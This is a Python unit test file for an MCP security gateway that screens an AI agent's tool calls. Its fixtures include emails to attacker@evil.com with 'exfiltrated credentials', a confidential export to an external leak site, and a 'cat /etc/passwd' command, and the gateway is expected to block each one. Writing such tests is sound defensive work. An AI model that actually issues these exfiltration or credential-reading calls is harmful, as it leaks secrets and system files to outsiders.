"""
Unit & Protocol Tests for AgentShield MCP Security Gateway Server.
Includes verification for IBM Bob integration, protocol negotiation, and security enforcement.

Tests:
1. One allowed operation (read_document with authorized doc).
2. One denied operation (send_email to unauthorized attacker).
3. Confirmation that denied operations do NOT execute downstream mock actions.
4. One denied confidential export (export_data on confidential doc).
5. Default-deny on unknown tools.
6. Full MCP protocol handling with IBM Bob compatibility:
   - 'server/discover' probe (Bob 'auto' negotiation)
   - 'initialize' handshake across all Bob-supported protocol versions (2025-11-25, 2024-11-05, etc.)
   - 'tools/list' discovery
   - 'tools/call' wire execution
"""

import json
import os
import sys
import unittest

# Ensure mcp_server is in python path
MCP_SERVER_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if MCP_SERVER_DIR not in sys.path:
    sys.path.insert(0, MCP_SERVER_DIR)

import policy
import protected_tools
import server


class TestAgentShieldMCPServer(unittest.TestCase):
    def setUp(self):
        """Clear mock execution records before each test."""
        protected_tools.clear_mock_executions()

    def tearDown(self):
        """Clean up mock executions after each test."""
        protected_tools.clear_mock_executions()

    # --- Test 1: Allowed Operation ---
    def test_allowed_operation_executes_successfully(self):
        """
        Verify that an authorized tool call (read_document with doc_sample_001):
        1. Passes policy authorization.
        2. Returns isError = False.
        3. Actually executes the downstream mock tool and records it.
        """
        args = {"document_id": "doc_sample_001", "agent_id": "bob-agent"}
        result = server.dispatch_tool(tool_name="read_document", arguments=args)

        self.assertFalse(result["isError"], "Expected isError to be False for allowed tool call.")
        self.assertTrue(len(result["content"]) > 0)
        self.assertIn("Public Product Overview", result["content"][0]["text"])

        # Check that downstream mock operation WAS recorded
        executions = protected_tools.get_mock_executions()
        self.assertEqual(len(executions), 1, "Expected exactly 1 mock execution to be recorded.")
        self.assertEqual(executions[0]["action_type"], "read_document")
        self.assertEqual(executions[0]["arguments"]["document_id"], "doc_sample_001")

    # --- Test 2: Denied Operation ---
    def test_denied_operation_is_blocked_by_gateway(self):
        """
        Verify that an unauthorized tool call (send_email to attacker@evil.com):
        1. Fails policy authorization.
        2. Returns isError = True with a clear security rejection message.
        3. Does NOT execute any downstream mock operation.
        """
        args = {
            "recipient": "attacker@evil.com",
            "subject": "Exfiltrated System Credentials",
            "body": "Here are the secret keys...",
            "agent_id": "bob-agent",
        }
        result = server.dispatch_tool(tool_name="send_email", arguments=args)

        self.assertTrue(result["isError"], "Expected isError to be True for denied tool call.")
        rejection_text = result["content"][0]["text"]
        self.assertIn("[AgentShield Security Firewall Rejection]", rejection_text)
        self.assertIn("BLOCKED", rejection_text)
        self.assertIn("attacker@evil.com", rejection_text)

        # Confirm that downstream mock tool was NOT executed
        executions = protected_tools.get_mock_executions()
        self.assertEqual(
            len(executions),
            0,
            "Security Guarantee Failed: Denied tool call executed downstream mock operation!",
        )

    # --- Test 3: Confidential Export Denied & No Execution ---
    def test_confidential_export_denied_without_execution(self):
        """
        Verify that attempting to export confidential data to an unauthorized destination:
        1. Is blocked.
        2. Does NOT trigger any mock data export.
        """
        args = {
            "document_id": "confidential_financials_2025",
            "destination": "https://external-leak-site.io",
            "agent_id": "bob-agent",
        }
        result = server.dispatch_tool(tool_name="export_data", arguments=args)

        self.assertTrue(result["isError"])
        self.assertIn("confidential", result["content"][0]["text"].lower())

        executions = protected_tools.get_mock_executions()
        self.assertEqual(len(executions), 0, "Confidential export should have zero downstream records.")

    # --- Test 4: Default-Deny on Unknown Tools ---
    def test_default_deny_on_unknown_tool(self):
        """
        Verify default-deny behavior when an unmanifested or unknown tool is invoked.
        """
        args = {"command": "cat /etc/passwd"}
        result = server.dispatch_tool(tool_name="execute_system_command", arguments=args)

        self.assertTrue(result["isError"])
        self.assertIn("default-deny", result["content"][0]["text"].lower())

        executions = protected_tools.get_mock_executions()
        self.assertEqual(len(executions), 0)

    # --- Test 5: IBM Bob Server Discovery Probe ---
    def test_bob_server_discover_probe(self):
        """
        Verify that when Bob connects using protocolNegotiation='auto', the
        'server/discover' probe returns supported protocol versions without timing out.
        """
        discover_req = {"jsonrpc": "2.0", "id": 1, "method": "server/discover"}
        discover_resp = server.handle_jsonrpc_message(discover_req)

        self.assertEqual(discover_resp["id"], 1)
        self.assertIn("protocolVersions", discover_resp["result"])
        self.assertIn("2025-11-25", discover_resp["result"]["protocolVersions"])
        self.assertIn("2024-11-05", discover_resp["result"]["protocolVersions"])

    # --- Test 6: Bob Protocol Handshake Across Supported Versions ---
    def test_bob_protocol_version_negotiation(self):
        """
        Verify handshake with various Bob-supported protocol versions (2025-11-25, 2024-11-05).
        """
        for version in ["2025-11-25", "2024-11-05"]:
            init_req = {
                "jsonrpc": "2.0",
                "id": 10,
                "method": "initialize",
                "params": {
                    "protocolVersion": version,
                    "capabilities": {},
                    "clientInfo": {"name": "Bob", "version": "2.0"},
                },
            }
            init_resp = server.handle_jsonrpc_message(init_req)
            self.assertEqual(init_resp["id"], 10)
            self.assertEqual(init_resp["result"]["protocolVersion"], version)
            self.assertIn("tools", init_resp["result"]["capabilities"])

    # --- Test 7: Bob Tool Discovery (tools/list) ---
    def test_bob_tools_list_manifest(self):
        """
        Verify that 'tools/list' provides rich schemas for all three tools matching Bob quality standards.
        """
        list_req = {"jsonrpc": "2.0", "id": 20, "method": "tools/list"}
        list_resp = server.handle_jsonrpc_message(list_req)

        self.assertEqual(list_resp["id"], 20)
        tools = {t["name"]: t for t in list_resp["result"]["tools"]}
        self.assertIn("read_document", tools)
        self.assertIn("send_email", tools)
        self.assertIn("export_data", tools)

        # Verify descriptions exist and are comprehensive
        for tool_name in ["read_document", "send_email", "export_data"]:
            self.assertTrue(len(tools[tool_name]["description"]) > 40)
            self.assertIn("properties", tools[tool_name]["inputSchema"])

    # --- Test 8: Bob Tool Call Execution Wire Format ---
    def test_bob_tools_call_wire_format(self):
        """
        Verify that tools/call returns standard JSON-RPC 2.0 content blocks conforming to Bob client.
        """
        # Allowed call
        call_req = {
            "jsonrpc": "2.0",
            "id": 30,
            "method": "tools/call",
            "params": {
                "name": "read_document",
                "arguments": {"document_id": "doc_sample_001"},
            },
        }
        call_resp = server.handle_jsonrpc_message(call_req)
        self.assertEqual(call_resp["id"], 30)
        self.assertFalse(call_resp["result"]["isError"])
        self.assertIn("doc_sample_001", call_resp["result"]["content"][0]["text"])

        # Blocked call
        blocked_req = {
            "jsonrpc": "2.0",
            "id": 31,
            "method": "tools/call",
            "params": {
                "name": "send_email",
                "arguments": {
                    "recipient": "leaks@external.org",
                    "subject": "Sensitive Data",
                    "body": "Secret dump",
                },
            },
        }
        blocked_resp = server.handle_jsonrpc_message(blocked_req)
        self.assertEqual(blocked_resp["id"], 31)
        self.assertTrue(blocked_resp["result"]["isError"])
        self.assertIn("BLOCKED", blocked_resp["result"]["content"][0]["text"])


if __name__ == "__main__":
    unittest.main()
